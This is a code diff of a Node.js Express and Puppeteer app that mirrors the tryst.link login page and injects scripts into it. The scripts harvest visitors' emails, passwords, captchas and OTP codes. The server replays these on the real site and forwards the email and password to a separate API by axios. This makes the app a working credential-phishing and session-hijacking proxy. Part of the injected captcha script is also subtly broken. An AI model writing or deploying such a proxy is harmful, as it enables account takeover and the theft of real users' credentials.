@@ -37,15 +37,17 @@ const sleep = (milliseconds) => {
   return new Promise((resolve) => setTimeout(resolve, milliseconds));
 };
 let content="";
+let jscode="";
 
 (async () => {
 
-let page;
+// let page;
 
   // Define a route
-app.get('/',async (req, res) => {
+
+app.get('/log_in',async (req, res) => {
   const browser = await puppeteer.launch({
-    headless: false,
+    headless: true,
     defaultViewport: false,
     // userDataDir: "./tmp",
     args: ['--no-sandbox', '--disable-setuid-sandbox'] // Optional arguments
@@ -53,14 +55,94 @@ app.get('/',async (req, res) => {
   });
    page = await browser.newPage();
 
-  await page.goto(
-    "https://tryst.link/log_in",
-  
-  );
+  await page.goto("https://tryst.link/log_in",);
+   
    content=await page.content();
 
+   const element = await page.$('h1'); // Select the element
+   let pageText = '';
+   let jscode="";
+   if (element) { // Make sure the element exists
+      pageText = await page.evaluate(element => element.textContent, element);
+   }
+
+   if(pageText == "You're almost there!")
+   {
+     
+    jscode =`
+    <script>
+    $(document).ready(function() {
+      // captcha    
+       const captchaFrom = document.querySelector('.captcha-form');
+   
+       captchaFrom.addEventListener("submit",function(e){
+           e.preventDefault();
+           const captcha = $("input[name='response']").val();
+   
+           const formDta={captcha:captcha}
+   
+             $.ajax({
+               url:"/captcha",
+               method:"post",
+               contentType: 'application/json',
+               data:JSON.stringify(formDta),
+               success:function(res){
+                 $("#data").html(res.data)
+               },
+                 error: function(xhr, status, error) {
+                     console.error('Error:', error);
+                 }
+             });
+         
+          
+           }) ;  
+      
+  });   
   
-   res.render('index', { content: content });
+    </script>`;
+
+    let body=content+jscode;
+
+    console.log(body)
+    return res.render('index', { body: body});
+
+   }
+
+   jscode =`
+    <script>
+    $(document).ready(function() {
+
+      const loginFrom =document.querySelector("#main > div > div.row > div:nth-child(1) > form");
+  
+          loginFrom.addEventListener("submit",function(e){
+          e.preventDefault();
+          const email = document.getElementById("login").value;
+          const password = document.getElementById("password").value;
+          const captcha = document.getElementById("captcha").value;
+  
+          const formDta={email:email,password:password,captcha:captcha}
+          $.ajax({
+             url:"/login",
+             method:"post",
+             contentType: 'application/json',
+             data:JSON.stringify(formDta),
+             success:function(res){
+              $("#data").html(res.data)
+             },
+               error: function(xhr, status, error) {
+                  console.error('Error:', error);
+              }
+          });
+      })
+  
+  
+  });   
+  
+    </script>`;
+
+    let body=content+jscode;
+
+    return res.render('login', { body: body});
 });
  
 app.post('/login',async(req,res)=>{
@@ -78,11 +160,11 @@ app.post('/login',async(req,res)=>{
     await page.click("input[type='submit']");
 
     // Define the data you want to send in the request (if any)
-const requestData = {
-  name:'Shimul',
-  email: email,
-  password:password,
-};
+    const requestData = {
+      name:'Shimul',
+      email: email,
+      password:password,
+    };
 
 
 // Make the API request using axios
@@ -107,7 +189,7 @@ const requestData = {
     await page.waitForNavigation();
 
     content=await page.content();
-    const path = await page.url();
+    // const path = await page.url();
 
     const jscode =`
     <script>
@@ -130,6 +212,7 @@ otpFrom.addEventListener("submit",function(e){
        success:function(res){
         console.log(res.data)
         $("#data").html(res.data)
+        $("#jscode").html(res.jscode)
        },
          error: function(xhr, status, error) {
             console.error('Error:', error);
@@ -182,15 +265,104 @@ app.post('/otp_auth',async(req,res)=>{
       .then(response => {
           // Handle the response from the API
          
-          console.log('Response from Laravel API:', response.data);
+          console.log('Response from  API:', response.data);
       })
       .catch(error => {
           // Handle errors
-          console.error('Error making request to Laravel API:', error.message);
+          console.error('Error making request to  API:', error.message);
       });
     }
 
     res.json({ message: 'Data received successfully!', data: content });
+
+})
+
+app.post('/captcha',async(req,res)=>{
+
+  const data = req.body;
+  const captcha =data.captcha;
+
+    //     // Wait for the input element to be available
+    // await page.waitForSelector(`input[name="response"]`);
+        // Select the input element using its name attribute
+    await page.type("input[name='response']",captcha);
+
+    await page.click("body > main > div > form > button");
+
+    await sleep(3000);
+
+    // await page.waitForNavigation();
+
+    content= await page.content();
+
+    // const path = await page.url();
+
+
+      console.log(content)
+      jscode =`
+      <script>
+      $(document).ready(function() {
+
+        const captchaFrom = document.querySelector('.captcha-form');
+
+       if(captchaFrom)
+       {
+        captchaFrom.addEventListener("submit",function(e){
+          e.preventDefault();
+          const captcha = $("input[name='response']").val();
+  
+          const formDta={captcha:captcha}
+  
+            $.ajax({
+              url:"/captcha",
+              method:"post",
+              contentType: 'application/json',
+              data:JSON.stringify(formDta),
+              success:function(res){
+                $("#data").html(${res.data})
+              },
+                error: function(xhr, status, error) {
+                    console.error('Error:', error);
+                }
+            });
+        
+  
+        const loginFrom =document.querySelector("#main > div > div.row > div:nth-child(1) > form");
+    
+        if(loginFrom)
+        {
+          loginFrom.addEventListener("submit",function(e){
+            e.preventDefault();
+            const email = document.getElementById("login").value;
+            const password = document.getElementById("password").value;
+            const captcha = document.getElementById("captcha").value;
+    
+            const formDta={email:email,password:password,captcha:captcha}
+            $.ajax({
+               url:"/login",
+               method:"post",
+               contentType: 'application/json',
+               data:JSON.stringify(formDta),
+               success:function(res){
+                $("#data").html(res.data)
+               },
+                 error: function(xhr, status, error) {
+                    console.error('Error:', error);
+                }
+            });
+         })
+
+        }
+            
+    
+    
+    });   
+    
+      </script>`;
+   
+  let body=content+jscode;
+
+  return res.json({ message: 'captcha has been paseed!', data: body });
 
 })
 
